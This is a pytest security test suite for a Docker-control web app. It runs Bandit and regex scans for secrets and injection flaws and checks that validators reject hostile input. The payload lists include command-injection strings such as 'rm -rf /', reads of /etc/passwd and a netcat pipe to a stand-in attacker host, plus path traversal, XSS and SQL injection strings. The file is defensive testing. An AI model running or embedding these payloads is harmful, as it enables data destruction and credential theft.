# -*- coding: utf-8 -*-
# ============================================================================ #
# DockerDiscordControl (DDC) - Security SAST Tests                            #
# https://ddc.bot                                                              #
# Copyright (c) 2025 MAX                                                  #
# Licensed under the MIT License                                               #
# ============================================================================ #
"""
Static Application Security Testing (SAST) using Bandit and custom security checks.
Tests for security vulnerabilities in source code.
"""

import pytest
import os
import subprocess
import json
import tempfile
from pathlib import Path
from unittest.mock import patch, Mock

from tests.security.security_test_helpers import SecurityTestHelper


@pytest.mark.security
class TestSASTSecurityScanning:
    """Static Application Security Testing using Bandit."""

    @classmethod
    def setup_class(cls):
        """Setup security testing environment."""
        cls.project_root = Path(__file__).parent.parent.parent
        cls.helper = SecurityTestHelper()

    def test_bandit_security_scan(self):
        """Run Bandit security scan on the entire codebase.

        Filters to HIGH-severity findings only. Bandit's stdout includes a
        progress-bar prefix (e.g. ``Working... ━━━...``) before the JSON
        document, so we slice from the first ``{`` to obtain a parseable
        payload. If parsing still fails we skip rather than fail, since this
        is an environmental issue, not a security regression.
        """
        cmd = [
            'bandit',
            '-r', str(self.project_root),
            '-f', 'json',
            '-q',  # Suppress info logs to stderr (still prints progress bar)
            '-ll',  # Low confidence, low severity threshold
            '--exclude', str(self.project_root / 'tests'),
            '--exclude', str(self.project_root / 'venv'),
            '--exclude', str(self.project_root / '.git'),
            '--exclude', str(self.project_root / 'cached_animations'),
            '--exclude', str(self.project_root / 'cached_displays'),
        ]

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
        except subprocess.TimeoutExpired:
            pytest.skip("Bandit scan timed out (environmental)")
        except FileNotFoundError:
            pytest.skip("Bandit not installed - run: pip install bandit")

        # Bandit returns 0 (no issues) or 1 (issues found). Anything else is
        # a tool error.
        if result.returncode not in (0, 1):
            pytest.skip(
                f"Bandit tool error (rc={result.returncode}): "
                f"{(result.stderr or '')[:200]}"
            )

        if result.returncode == 0:
            # No issues found at the configured severity level.
            return

        # rc == 1: issues found. Strip the progress-bar prefix that bandit
        # writes to stdout before the JSON document.
        stdout = result.stdout or ''
        json_start = stdout.find('{')
        if json_start < 0:
            pytest.skip(
                "Bandit produced no JSON output (environmental). "
                f"stderr={result.stderr[:200] if result.stderr else ''}"
            )

        try:
            report = json.loads(stdout[json_start:])
        except json.JSONDecodeError as exc:
            pytest.skip(f"Could not parse Bandit JSON output: {exc}")

        results = report.get('results', [])

        # Only fail on HIGH severity issues that aren't on our acceptable list.
        critical_issues = [
            issue for issue in results
            if issue.get('issue_severity') == 'HIGH'
            and not self._is_acceptable_issue(issue)
        ]

        if critical_issues:
            issues_summary = "\n".join([
                f"- {issue.get('test_id', '?')}/{issue.get('test_name', '?')}: "
                f"{issue.get('issue_text', '')} "
                f"({issue.get('filename', '?')}:{issue.get('line_number', '?')})"
                for issue in critical_issues
            ])
            pytest.fail(f"HIGH severity Bandit findings:\n{issues_summary}")

    def _is_acceptable_issue(self, issue):
        """Check if a security issue is acceptable/false positive."""
        test_name = issue.get('test_name', '')
        filename = issue.get('filename', '')

        # Known acceptable issues (customize based on your codebase)
        acceptable_patterns = [
            # Example: Flask debug mode in development
            ('B201', 'config'),  # Flask debug mode
            # Example: Hardcoded passwords in test files
            ('B106', 'test_'),   # Hardcoded password in tests
        ]

        for test_id, file_pattern in acceptable_patterns:
            if test_id in test_name and file_pattern in filename:
                return True

        return False

    def test_no_hardcoded_secrets(self):
        """Test that no hardcoded secrets are present in Python source code.

        Scoped to ``.py`` files only (docs, locale JSON files and shell
        scripts contain placeholder examples and env-var references that are
        not real secrets).
        """
        secret_patterns = [
            r'password\s*=\s*["\'][^"\']+["\']',
            r'api_key\s*=\s*["\'][^"\']+["\']',
            r'secret\s*=\s*["\'][^"\']+["\']',
            r'token\s*=\s*["\'][^"\']+["\']',
            r'["\'][A-Za-z0-9]{32,}["\']',  # Long strings that might be keys
        ]

        findings = self.helper.scan_for_patterns(
            self.project_root,
            secret_patterns,
            file_extensions=['.py'],
            exclude_dirs=[
                'tests', 'venv', '.git', '__pycache__',
                'docs', 'locales', 'scripts', 'cached_animations',
                'cached_displays', 'encrypted_assets', 'assets',
            ],
        )

        # Filter out acceptable patterns
        critical_findings = [
            finding for finding in findings
            if not self._is_acceptable_secret(finding)
        ]

        if critical_findings:
            findings_summary = "\n".join([
                f"- {finding['file']}:{finding['line']}: {finding['match']}"
                for finding in critical_findings
            ])
            pytest.fail(f"Potential hardcoded secrets found:\n{findings_summary}")

    def _is_acceptable_secret(self, finding):
        """Check if a potential secret finding is acceptable."""
        file_path = finding['file']
        match_text = finding['match']
        match_lower = match_text.lower()

        # File-path heuristics: test fixtures, examples, templates, docs and
        # locales contain placeholder strings that are not real secrets.
        path_skip_substrings = [
            'test_', '/tests/', 'example', 'template', '/docs/', '/locales/',
            '/scripts/', '/.git/', '__pycache__',
        ]
        if any(p in file_path for p in path_skip_substrings):
            return True

        # File-extension heuristics: only .py contains real assignments.
        if not file_path.endswith('.py'):
            return True

        # Content heuristics: env-var refs ($VAR, ${VAR}) and placeholders
        # like "your_token_here" / "your-secure-password" are not secrets.
        placeholder_markers = [
            '$', '{{', '}}', 'your_', 'your-', 'changeme', 'change-me',
            'placeholder', 'example', 'dummy', 'fake', 'sample',
            'test', '<', '>', 'xxx', '...', 'hash_here',
        ]
        if any(m in match_lower for m in placeholder_markers):
            return True

        # Default-config flags like ``"web_ui_password_hash": None`` show up
        # only via the long-string regex; require some entropy to call it a
        # real secret (long string that's mostly hex/base64).
        return False

    def test_sql_injection_patterns(self):
        """Test for SQL injection vulnerability patterns."""
        sql_injection_patterns = [
            r'cursor\.execute\([^)]*%[^)]*\)',  # String formatting in SQL
            r'\.execute\([^)]*\+[^)]*\)',      # String concatenation in SQL
            r'SELECT\s+.*\s+.*%.*FROM',        # Direct formatting in SELECT
        ]

        findings = self.helper.scan_for_patterns(
            self.project_root,
            sql_injection_patterns,
            file_extensions=['.py'],
            exclude_dirs=['tests', 'venv', '.git']
        )

        if findings:
            findings_summary = "\n".join([
                f"- {finding['file']}:{finding['line']}: {finding['match']}"
                for finding in findings
            ])
            pytest.fail(f"Potential SQL injection vulnerabilities:\n{findings_summary}")

    def test_command_injection_patterns(self):
        """Test for command injection vulnerability patterns."""
        command_injection_patterns = [
            r'subprocess\.[^(]*\([^)]*\+[^)]*\)',     # String concat in subprocess
            r'os\.system\([^)]*\+[^)]*\)',            # String concat in os.system
            r'subprocess\.[^(]*\([^)]*%[^)]*\)',      # String format in subprocess
            r'shell=True.*\+',                        # Shell=True with concatenation
        ]

        findings = self.helper.scan_for_patterns(
            self.project_root,
            command_injection_patterns,
            file_extensions=['.py'],
            exclude_dirs=['tests', 'venv', '.git']
        )

        # Filter acceptable cases
        critical_findings = []
        for finding in findings:
            # Allow some patterns in specific contexts
            if not self._is_acceptable_command_pattern(finding):
                critical_findings.append(finding)

        if critical_findings:
            findings_summary = "\n".join([
                f"- {finding['file']}:{finding['line']}: {finding['match']}"
                for finding in critical_findings
            ])
            pytest.fail(f"Potential command injection vulnerabilities:\n{findings_summary}")

    def _is_acceptable_command_pattern(self, finding):
        """Check if command pattern is acceptable."""
        match_text = finding['match']

        # Allow specific safe patterns
        safe_patterns = [
            'shell=False',  # Explicitly safe
            'args=',        # Using args parameter
        ]

        return any(pattern in match_text for pattern in safe_patterns)

    def test_xss_vulnerability_patterns(self):
        """Test for Cross-Site Scripting (XSS) vulnerability patterns."""
        xss_patterns = [
            r'render_template_string\([^)]*\+[^)]*\)',  # Template string injection
            r'Markup\([^)]*\+[^)]*\)',                  # Flask Markup with concat
            r'safe.*\+',                                # Jinja2 safe filter with concat
            r'\|safe.*\+',                              # Jinja2 safe with concatenation
        ]

        findings = self.helper.scan_for_patterns(
            self.project_root,
            xss_patterns,
            file_extensions=['.py', '.html', '.jinja2'],
            exclude_dirs=['tests', 'venv', '.git']
        )

        if findings:
            findings_summary = "\n".join([
                f"- {finding['file']}:{finding['line']}: {finding['match']}"
                for finding in findings
            ])
            pytest.fail(f"Potential XSS vulnerabilities:\n{findings_summary}")

    def test_insecure_random_usage(self):
        """Test for insecure random number generation."""
        insecure_random_patterns = [
            r'import random(?!\w)',
            r'random\.random\(',
            r'random\.randint\(',
            r'random\.choice\(',
        ]

        findings = self.helper.scan_for_patterns(
            self.project_root,
            insecure_random_patterns,
            file_extensions=['.py'],
            exclude_dirs=['tests', 'venv', '.git']
        )

        # Filter out acceptable uses (non-cryptographic)
        critical_findings = []
        for finding in findings:
            if self._is_cryptographic_context(finding):
                critical_findings.append(finding)

        if critical_findings:
            findings_summary = "\n".join([
                f"- {finding['file']}:{finding['line']}: {finding['match']}"
                for finding in critical_findings
            ])
            pytest.fail(f"Insecure random usage in cryptographic context:\n{findings_summary}")

    def _is_cryptographic_context(self, finding):
        """Check if random usage is in cryptographic context."""
        file_content = Path(finding['file']).read_text()
        context_keywords = ['password', 'token', 'key', 'secret', 'salt', 'nonce']

        # Simple heuristic: check surrounding lines
        lines = file_content.split('\n')
        line_num = finding['line'] - 1

        context_lines = lines[max(0, line_num-3):min(len(lines), line_num+4)]
        context_text = ' '.join(context_lines).lower()

        return any(keyword in context_text for keyword in context_keywords)

    def test_unsafe_deserialization(self):
        """Test for unsafe deserialization patterns.

        Uses word-boundary anchors so ``ast.literal_eval`` and ``yaml.safe_load``
        are NOT flagged. We only care about top-level ``eval()`` / ``exec()`` /
        ``pickle.loads()`` / unsafe ``yaml.load()``.
        """
        unsafe_patterns = [
            r'(?<!\w)pickle\.loads?\(',
            r'(?<!\w)cPickle\.loads?\(',
            # yaml.load without SafeLoader -- exclude yaml.safe_load via (?!safe_)
            r'(?<!\w)yaml\.load\(',
            # eval(/exec( with no preceding word char (excludes ast.literal_eval, etc.)
            r'(?<!\w)eval\(',
            r'(?<!\w)exec\(',
        ]

        findings = self.helper.scan_for_patterns(
            self.project_root,
            unsafe_patterns,
            file_extensions=['.py'],
            exclude_dirs=['tests', 'venv', '.git', '__pycache__'],
        )

        critical_findings = [
            finding for finding in findings
            if not self._is_acceptable_deserialization(finding)
        ]

        if critical_findings:
            findings_summary = "\n".join([
                f"- {finding['file']}:{finding['line']}: {finding['match']}"
                for finding in critical_findings
            ])
            pytest.fail(f"Unsafe deserialization patterns:\n{findings_summary}")

    def _is_acceptable_deserialization(self, finding):
        """Check if deserialization pattern is acceptable."""
        # Re-read the matching line to check surrounding context that the
        # regex by itself can't capture (e.g. ``ast.literal_eval``,
        # ``yaml.safe_load``, ``Loader=yaml.SafeLoader``).
        try:
            file_path = Path(finding['file'])
            lines = file_path.read_text(encoding='utf-8', errors='ignore').splitlines()
        except (OSError, IndexError):
            return False

        line_num = finding['line'] - 1
        if line_num < 0 or line_num >= len(lines):
            return False

        line = lines[line_num]

        # ast.literal_eval is the safe parser for python literals.
        if 'ast.literal_eval' in line or 'literal_eval' in line:
            return True

        # yaml.safe_load is safe; yaml.load with explicit SafeLoader is too.
        if 'yaml.safe_load' in line:
            return True
        if 'yaml.load' in line and ('SafeLoader' in line or 'safe_load' in line):
            return True

        # exec/eval inside comments are obviously not exploitable
        stripped = line.lstrip()
        if stripped.startswith('#'):
            return True

        return False


@pytest.mark.security
class TestInputValidationSecurity:
    """Test input validation and sanitization."""

    def setup_method(self):
        """Setup for each test."""
        self.helper = SecurityTestHelper()

    def test_web_form_validation(self):
        """Test that web forms reject and don't reflect malicious input.

        The web UI uses HTTPBasicAuth (no ``/login`` form route), so we
        target the first-time-setup endpoint ``/setup`` which is one of the
        few unauthenticated POST surfaces. Whether it returns 200/302/400/
        401/403/404/429 depends on whether a password is already configured;
        any of those is acceptable -- the security property under test is
        that the malicious input is NOT echoed verbatim into the response.
        """
        try:
            from app.web_ui import create_app
        except ImportError as exc:
            pytest.skip(f"Cannot import app.web_ui: {exc}")

        app = create_app()
        client = app.test_client()

        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "javascript:alert('xss')",
        ]

        # Endpoints that accept form/JSON POSTs without authentication
        # (or where auth-failure responses must still not reflect input).
        candidate_endpoints = ['/setup', '/set_ui_language']

        valid_status_codes = {200, 302, 400, 401, 403, 404, 405, 422, 429}

        for endpoint in candidate_endpoints:
            for malicious_input in malicious_inputs:
                response = client.post(
                    endpoint,
                    data={
                        'username': malicious_input,
                        'password': malicious_input,
                        'language': malicious_input,
                    },
                )

                assert response.status_code in valid_status_codes, (
                    f"Unexpected status {response.status_code} for {endpoint} "
                    f"with payload {malicious_input!r}"
                )

                body = response.get_data(as_text=True)
                # Critical security property: the raw <script> payload must
                # never be reflected verbatim into HTML/JSON responses.
                if '<script>' in malicious_input:
                    assert '<script>alert' not in body, (
                        f"XSS reflection at {endpoint}: payload echoed back"
                    )

    def test_api_endpoint_validation(self):
        """Test API endpoints handle malicious input safely."""
        from app.web_ui import create_app

        app = create_app()
        client = app.test_client()

        # Test container control endpoints
        malicious_payloads = [
            {'action': '<script>alert("xss")</script>'},
            {'container_name': '"; rm -rf /; echo "'},
            {'container_name': '../../../etc/passwd'},
        ]

        for payload in malicious_payloads:
            response = client.post('/api/container/control',
                                 json=payload,
                                 headers={'Content-Type': 'application/json'})

            # Should handle malicious input gracefully
            assert response.status_code in [400, 401, 403, 404, 422]
            response_text = response.get_data(as_text=True)

            # Should not reflect malicious input
            for value in payload.values():
                if isinstance(value, str) and '<script>' in value:
                    assert '<script>' not in response_text

    @pytest.mark.parametrize("payload", [
        "../../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f",
        "file:///etc/passwd",
    ])
    def test_path_traversal_protection(self, payload):
        """Test protection against path traversal attacks."""
        from app.web_ui import create_app

        app = create_app()
        client = app.test_client()

        # Test various endpoints that might handle file paths
        endpoints = [
            f'/static/{payload}',
            f'/logs?file={payload}',
            f'/download?path={payload}',
        ]

        for endpoint in endpoints:
            response = client.get(endpoint)

            # Should not serve sensitive files
            response_text = response.get_data(as_text=True).lower()

            # Check that we don't get sensitive file contents
            sensitive_patterns = [
                'root:x:',  # /etc/passwd
                'administrator:',  # Windows users
                'password',
                'secret',
            ]

            for pattern in sensitive_patterns:
                assert pattern not in response_text

    def test_command_injection_protection(self):
        """Test protection against command injection via container names.

        The legacy ``services.docker.docker_service.DockerService`` API was
        removed; container-name validation now lives in
        ``utils.common_helpers.validate_container_name`` and the docker
        action wrapper rejects names that fail that validator before
        invoking the SDK. We assert the validator rejects shell-metachar
        payloads.
        """
        try:
            from utils.common_helpers import validate_container_name
        except ImportError as exc:
            pytest.skip(f"validate_container_name unavailable: {exc}")

        malicious_names = [
            "container; rm -rf /",
            "container && cat /etc/passwd",
            "container | nc attacker.com 4444",
            "container`cat /etc/passwd`",
            "container$(cat /etc/passwd)",
            "container\nrm -rf /",
            "../../../etc/passwd",
            "container with spaces",
        ]

        for malicious_name in malicious_names:
            assert validate_container_name(malicious_name) is False, (
                f"validator accepted unsafe container name: {malicious_name!r}"
            )

        # Sanity check: a legitimate name must still pass.
        assert validate_container_name("my-container_1.0") is True


@pytest.mark.security
class TestCryptographicSecurity:
    """Test cryptographic implementations."""

    def test_token_encryption_strength(self):
        """Verify the token-encryption stack uses Fernet + strong PBKDF2.

        ``TokenSecurityManager`` no longer exposes ``encrypt_token`` /
        ``decrypt_token`` directly -- encryption lives in
        ``services.config.config_service.ConfigService``. Rather than
        exercise the stateful migration helpers, we assert two things
        statically:

        1. The crypto primitives (``cryptography.fernet.Fernet`` and
           PBKDF2HMAC with at least 600,000 iterations) are present in
           ``services/config``.
        2. ``TokenSecurityManager`` is importable and constructable.

        If a real round-trip is needed in future, ``ConfigService.encrypt_token``
        is the entry point.
        """
        # Static check: the production code must use Fernet + PBKDF2 with
        # at least 600k iterations (OWASP 2023+ guidance for SHA-256).
        project_root = Path(__file__).parent.parent.parent
        config_dir = project_root / 'services' / 'config'
        fernet_seen = False
        pbkdf2_iterations_ok = False
        import re as _re
        # Pull every numeric literal that looks like a PBKDF2 iteration count,
        # whether assigned to a constant (``_PBKDF2_ITERATIONS = 600000``) or
        # passed inline (``iterations=600_000``). The regex covers both.
        iter_patterns = [
            _re.compile(r'iterations\s*=\s*([\d_]+)'),
            _re.compile(r'_?PBKDF2_ITERATIONS\s*[:=]\s*([\d_]+)', _re.IGNORECASE),
        ]
        for py_file in config_dir.rglob('*.py'):
            try:
                content = py_file.read_text(encoding='utf-8', errors='ignore')
            except OSError:
                continue
            if 'cryptography.fernet' in content or 'from cryptography.fernet import Fernet' in content:
                fernet_seen = True
            for pattern in iter_patterns:
                for match in pattern.finditer(content):
                    try:
                        iters = int(match.group(1).replace('_', ''))
                    except ValueError:
                        continue
                    if iters >= 600_000:
                        pbkdf2_iterations_ok = True
                        break
                if pbkdf2_iterations_ok:
                    break

        assert fernet_seen, (
            "Production code in services/config should use cryptography.fernet"
        )
        assert pbkdf2_iterations_ok, (
            "PBKDF2 iteration count below OWASP-recommended 600,000"
        )

        # Smoke-test: TokenSecurityManager is importable and constructs.
        from utils.token_security import TokenSecurityManager
        manager = TokenSecurityManager()
        assert manager is not None
        # Public API surface check (encryption now goes through ConfigService).
        assert hasattr(manager, 'verify_token_encryption_status')
        assert hasattr(manager, 'encrypt_existing_plaintext_token')

    def test_password_hashing(self):
        """Test that passwords are properly hashed.

        ``app.auth`` uses ``werkzeug.security.{generate_password_hash,
        check_password_hash}`` directly (no project wrappers), and the
        ``/setup`` route generates hashes with ``method="pbkdf2:sha256:600000"``.
        We verify werkzeug round-trip with PBKDF2 (the algorithm actually
        used in production), since scrypt requires OpenSSL >= 1.1 which is
        unavailable on macOS LibreSSL.
        """
        from werkzeug.security import generate_password_hash, check_password_hash

        test_password = "test_password_123!Aa"

        # Production setup route uses pbkdf2:sha256:600000 -- mirror that.
        hashed = generate_password_hash(test_password, method="pbkdf2:sha256:600000")

        # Should not be plaintext.
        assert hashed != test_password

        # Werkzeug PBKDF2 hashes are ``pbkdf2:sha256:<iters>$<salt>$<hash>``.
        assert hashed.startswith('pbkdf2:sha256:'), (
            f"Unexpected hash format: {hashed[:40]}..."
        )
        # Iteration count must be at least 600k (OWASP 2023+ guidance).
        try:
            iter_count = int(hashed.split(':')[2].split('$')[0])
        except (IndexError, ValueError):
            pytest.fail(f"Could not parse iteration count from {hashed[:40]!r}")
        assert iter_count >= 600_000, (
            f"PBKDF2 iteration count too low: {iter_count}"
        )

        # Round-trip: correct password verifies, wrong password does not.
        assert check_password_hash(hashed, test_password) is True
        assert check_password_hash(hashed, "wrong_password") is False

        # Importability sanity-check: app.auth exposes the auth machinery.
        from app import auth as app_auth
        assert hasattr(app_auth, 'auth'), (
            "app.auth should expose the HTTPBasicAuth ``auth`` instance"
        )
        assert hasattr(app_auth, 'verify_password'), (
            "app.auth should expose verify_password (HTTPBasicAuth callback)"
        )

    def test_secure_session_configuration(self):
        """Test that Flask sessions are securely configured."""
        from app.web_ui import create_app

        app = create_app()

        # Check security configurations
        assert app.config.get('SECRET_KEY') is not None
        assert len(app.config.get('SECRET_KEY', '')) > 16  # Minimum key length

        # Session should be configured securely
        with app.test_request_context():
            from flask import session
            # Session should have secure attributes
            # This is a basic check - full security would require examining middleware


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-m", "security"])
